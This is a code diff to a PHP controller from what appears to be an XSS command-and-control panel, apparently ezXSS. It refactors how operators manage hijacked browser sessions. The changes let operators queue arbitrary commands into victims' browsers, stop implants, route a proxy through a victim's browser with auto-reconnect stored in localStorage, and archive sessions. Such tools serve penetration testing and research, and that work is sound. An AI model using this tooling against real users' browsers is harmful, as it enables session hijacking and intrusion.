@@ -33,7 +33,7 @@ class Persistent extends Controller
 
         // Check payload permissions
         $payloadList = $this->payloadList();
-        if (!is_numeric($id) || !in_array(+$id, $payloadList, true)) {
+        if (!is_numeric($id) || (!in_array(+$id, $payloadList, true) && !$this->isAdmin())) {
             throw new Exception('You dont have permissions to this payload');
         }
 
@@ -43,6 +43,10 @@ class Persistent extends Controller
             $name = !$val ? 'All payloads' : $this->model('Payload')->getById($val)['payload'];
             $payloads[] = ['id' => $val, 'name' => ucfirst($name), 'selected' => $val == $id ? 'selected' : ''];
         }
+        if(!in_array($id, $payloadList) && $this->isAdmin()) {
+            $payload = $this->model('Payload')->getById($id);
+            $payloads[] = ['id' => $id, 'name' => ucfirst($payload['payload']), 'selected' => 'selected'];
+        }
         $this->view->renderDataset('payload', $payloads);
 
         return $this->showContent();
@@ -51,19 +55,17 @@ class Persistent extends Controller
     /**
      * Renders the session view and returns the content.
      * 
-     * @param string $clientId The client id
+     * @param string $link The client link
      * @throws Exception
      * @return string
      */
-    public function session($clientId)
+    public function session($link)
     {
         $this->isLoggedInOrExit();
         $this->view->setTitle('Online');
         $this->view->renderTemplate('persistent/session');
 
-        $clientId = explode('~', $clientId ?? '');
-        $origin = $clientId[1] ?? '';
-        $clientId = $clientId[0] ?? '';
+        [$clientId, $origin] = $this->decodelink($link);
 
         if (!$this->hasSessionPermissions($clientId, $origin)) {
             throw new Exception('You dont have permissions to this session');
@@ -71,50 +73,14 @@ class Persistent extends Controller
 
         $session = $this->model('Session')->getByClientId($clientId, $origin);
 
-        if ($this->isPOST()) {
+        if (isPOST()) {
             try {
-                $this->validateCsrfToken();
-
-                $this->view->setContentType('application/json');
-
-                // Check if posted data is deleting session
-                if ($this->getPostValue('delete') !== null) {
-                    $this->model('Session')->deleteAll($clientId, $origin);
-                    redirect('/manage/persistent/all');
+                if(isJSON()) {
+                    $this->sessionManageJSON($clientId, $origin);
+                } else {
+                    $message = $this->sessionManage($clientId, $origin);
+                    $this->view->renderMessage($message);
                 }
-
-                // Check if posted data is killing persistent
-                if ($this->getPostValue('kill') !== null) {
-                    $this->model('Console')->add($clientId, $origin, 'ez_stop()');
-                    throw new Exception('Kill commando send to session');
-                }
-
-                // Check if posted data is executing command
-                if ($this->getPostValue('execute') !== null) {
-                    $command = $this->getPostValue('command');
-                    $this->model('Console')->add($clientId, $origin, $command);
-                    return json_encode(1);
-                }
-
-                // Check if posted data is getting console data
-                if ($this->getPostValue('getconsole') !== null) {
-                    $console = $this->model('Session')->getAllConsole($clientId, $origin);
-                    return json_encode(['console' => $console]);
-                }
-
-                // Check if posted data is starting proxy
-                if ($this->getPostValue('proxy') !== null) {
-                    $ipport = $this->getPostValue('ipport');
-
-                    if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
-                        throw new Exception('This does not look like a valid domain/IP with port');
-                    }
-
-                    $passOrigin = $this->getPostValue('passorigin') !== null ? '1' : '0';
-                    $this->model('Console')->add($clientId, $origin, "ez_soc('$ipport', $passOrigin)");
-                    throw new Exception("Proxy started on $ipport is accessible on http://$clientId.ezxss" . ($passOrigin === '1' ? " and http://$origin" : ''));
-                }
-
             } catch (Exception $e) {
                 $this->view->setContentType('text/html');
                 $this->view->renderMessage($e->getMessage());
@@ -122,11 +88,12 @@ class Persistent extends Controller
         }
 
         // Render all rows
+        $this->view->renderData('link', base64url_encode($clientId . '~' . $origin));
         $this->view->renderData('time', date('F j, Y, g:i a', $session['time']));
         $this->view->renderData('requests', $this->model('Session')->getRequestCount($clientId));
 
-        $session['browser'] = $this->parseUserAgent($session['user-agent']);
-        $session['last'] = $this->parseTimestamp($session['time'], 'long');
+        $session['browser'] = parseUserAgent($session['user-agent']);
+        $session['last'] = parseTimestamp($session['time'], 'long');
 
         $console = $this->model('Session')->getAllConsole($clientId, $origin);
         $this->view->renderData('console', $console);
@@ -136,25 +103,111 @@ class Persistent extends Controller
         }
 
         return $this->showContent();
+    }
 
+    /*
+    * Manage session by POST request
+    */
+    private function sessionManage($clientId, $origin)
+    {
+        $this->validateCsrfToken();
+
+        if (_POST('proxy') !== null) {
+            $ipport = _POST('ipport');
+
+            if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
+                throw new Exception('This does not look like a valid domain/IP with port');
+            }
+
+            $passOrigin = _POST('passorigin') !== null ? '1' : '0';
+            $autoReconnect = _POST('autoreconnect') !== null;
+            
+            $this->model('Console')->add($clientId, $origin, "ez_soc('$ipport', $passOrigin)");
+            if ($autoReconnect) {
+                $this->model('Console')->add($clientId, $origin, "localStorage.setItem('ezProxy', '$ipport');");
+            }
+            return "Proxy started on $ipport is accessible on http://$clientId.ezxss" . 
+                    ($passOrigin === '1' ? " and http://$origin" : '') . 
+                    ($autoReconnect ? ' (Auto reconnect enabled)' : '');
+        }
+        
+        if (_POST('delete') !== null) {
+            $this->validateCsrfToken();
+            $this->model('Session')->deleteAll($clientId, $origin);
+            redirect('/manage/persistent/all');
+        }
+        
+        if (_POST('kill') !== null) {
+            $this->validateCsrfToken();
+            $this->model('Console')->add($clientId, $origin, 'ez_stop()');
+            return 'Killed persistent';
+        }
+        
+        if (_POST('archive') !== null) {
+            $this->validateCsrfToken();
+            $this->model('Session')->archiveByClientId($clientId, $origin);
+            return 'Archived session';
+        }
+        
+        if (_POST('killreconnect') !== null) {
+            $this->validateCsrfToken();
+            $this->model('Console')->add($clientId, $origin, "localStorage.removeItem('ezProxy');");
+            return 'Killed auto reconnect';
+        }
+
+        return 'Invalid request';
+    }
+
+    /*
+    * Manage session by JSON request
+    */
+    private function sessionManageJSON($clientId, $origin)
+    {
+        $this->isAPIRequest();
+
+        if (_JSON('delete') !== null) {
+            $this->model('Session')->deleteAll($clientId, $origin);
+            return jsonResponse('success', 1);
+        }
+
+        elseif (_JSON('kill') !== null) {
+            $this->model('Console')->add($clientId, $origin, 'ez_stop()');
+            return jsonResponse('success', 1);
+        }
+
+        elseif (_JSON('execute') !== null) {
+            $command = _JSON('command');
+            $this->model('Console')->add($clientId, $origin, $command);
+            return jsonResponse('success', 1);
+        }
+
+        elseif (_JSON('archive') !== null) {
+            $this->model('Session')->archiveByClientId($clientId, $origin);
+            return jsonResponse('success', 1);
+        }
+
+        elseif (_JSON('getconsole') !== null) {
+            $console = $this->model('Session')->getAllConsole($clientId, $origin);
+            return jsonResponse('console', $console);
+        }
+
+        return jsonResponse('error', 'Invalid request');
     }
 
     /**
      * Renders all the requests of a session.
      * 
-     * @param string $clientId The client id
+     * @param string $link The client link
      * @throws Exception
      * @return string
      */
-    public function requests($clientId)
+    public function requests($link)
     {
         $this->isLoggedInOrExit();
         $this->view->setTitle('Online');
         $this->view->renderTemplate('persistent/requests');
 
-        $clientId = explode('~', $clientId ?? '');
-        $origin = $clientId[1] ?? '';
-        $clientId = $clientId[0] ?? '';
+        [$clientId, $origin] = $this->decodelink($link);
 
         if (!$this->hasSessionPermissions($clientId, $origin)) {
             throw new Exception('You dont have permissions to this session');
@@ -163,9 +216,10 @@ class Persistent extends Controller
         $requests = $this->model('Session')->getAllByClientId($clientId, $origin);
 
         foreach ($requests as $key => $value) {
-            $requests[$key]['browser'] = $this->parseUserAgent($requests[$key]['user-agent']);
-            $requests[$key]['last'] = $this->parseTimestamp($requests[$key]['time'], 'long');
+            $requests[$key]['browser'] = parseUserAgent($requests[$key]['user-agent']);
+            $requests[$key]['last'] = parseTimestamp($requests[$key]['time'], 'long');
             $requests[$key]['shorturi'] = substr($requests[$key]['uri'], 0, 50);
+            $requests[$key]['link'] = base64url_encode($requests[$key]['clientid'] . '~' . $requests[$key]['origin']);
         }
 
         $this->view->renderCondition('hasRequests', count($requests) > 0);
@@ -188,7 +242,7 @@ class Persistent extends Controller
         $this->view->renderTemplate('persistent/request');
 
         $request = $this->model('Session')->getById($id);
-        $clientId = $request['clientId'] ?? '';
+        $clientId = $request['clientid'] ?? '';
         $origin = $request['origin'] ?? '';
 
         if (!$this->hasSessionPermissions($clientId, $origin)) {
@@ -201,7 +255,89 @@ class Persistent extends Controller
             $this->view->renderData($value, $request[$value]);
         }
 
+        $this->view->renderData('link', base64url_encode($clientId . '~' . $origin));
+        
         return $this->showContent();
+    }
+
+    /**
+     * Renders the list of all sessions within payload and returns the content.
+     * 
+     * @return string
+     */
+    public function sessions()
+    {
+        $this->isAPIRequest();
+
+        $id = _JSON('id');
+        $archive = _JSON('archive') === 1 ? 1 : 0;
+
+        // Check payload permissions
+        $payloadList = $this->payloadList();
+        if (!is_numeric($id) || (!in_array(+$id, $payloadList, true) && !$this->isAdmin())) {
+            return jsonResponse('error', 'You dont have permissions to this payload');
+        }
+
+        // Checks if requested id is 'all'
+        if (+$id === 0) {
+            if ($this->isAdmin()) {
+                // Show all sessions
+                $sessions = $this->model('Session')->getAllByArchive($archive);
+            } else {
+                // Show all sessions of allowed payloads
+                $sessions = [];
+                foreach ($payloadList as $payloadId) {
+                    if ($payloadId !== 0) {
+                        $payload = $this->model('Payload')->getById($payloadId);
+                        $payloadUri = '//' . $payload['payload'];
+                        if (strpos($payload['payload'], '/') === false) {
+                            $payloadUri .= '/%';
+                        }
+                        $sessions = array_merge($sessions, $this->model('Session')->getAllByPayload($payloadUri, $archive));
+                    }
+                }
+            }
+        } else {
+            // Show sessions of payload
+            $payload = $this->model('Payload')->getById($id);
+
+            $payloadUri = '//' . $payload['payload'];
+            if (strpos($payload['payload'], '/') === false) {
+                $payloadUri .= '/%';
+            }
+            $sessions = $this->model('Session')->getAllByPayload($payloadUri, $archive);
+        }
+
+        foreach ($sessions as $key => $value) {
+            $sessions[$key]['browser'] = parseUserAgent($sessions[$key]['user-agent']);
+            $sessions[$key]['last'] = parseTimestamp($sessions[$key]['time'], 'long');
+            $sessions[$key]['shorturi'] = substr($sessions[$key]['uri'], 0, 50);
+            $sessions[$key]['link'] = base64url_encode($sessions[$key]['clientid'] . '~' . $sessions[$key]['origin']);
+        }
+
+        return jsonResponse('data', $sessions);
+    }
+
+    /**
+     * Archives a session.
+     * 
+     * @param string $link The client link
+     * @throws Exception
+     * @return string
+     */
+    public function archive($link)
+    {
+        $this->isAPIRequest();
+
+        [$clientId, $origin] = $this->decodelink($link);
+
+        if (!$this->hasSessionPermissions($clientId, $origin)) {
+            return jsonResponse('error', 'You dont have permissions to this session');
+        }
+
+        $this->model('Session')->archiveByClientId($clientId, $origin);
+
+        return jsonResponse('success', 1);
     }
 
     /**
@@ -219,7 +355,7 @@ class Persistent extends Controller
 
         // Get data about report and payloads of user
         $session = $this->model('Session')->getByClientId($clientId, $origin);
-        $user = $this->model('User')->getById($this->session->data('id'));
+        $user = $this->user();
         $payloads = $this->model('Payload')->getAllByUserId($user['id']);
 
         // Check all payloads if it correspondents to session 
@@ -239,5 +375,28 @@ class Persistent extends Controller
         }
 
         return false;
+    }
+
+    /**
+     * Decodes the client path
+     * 
+     * @param string $link The client path
+     * @throws Exception
+     * @return array
+     */
+    private function decodelink($link)
+    {
+        try {
+            $link = base64url_decode($link);
+            $link = explode('~', $link);
+
+            if (count($link) !== 2) {
+                throw new Exception('Not found');
+            }
+
+            return [$link[0], $link[1]];
+        } catch (Exception $e) {
+            throw new Exception('Not found');
+        }
     }
 }
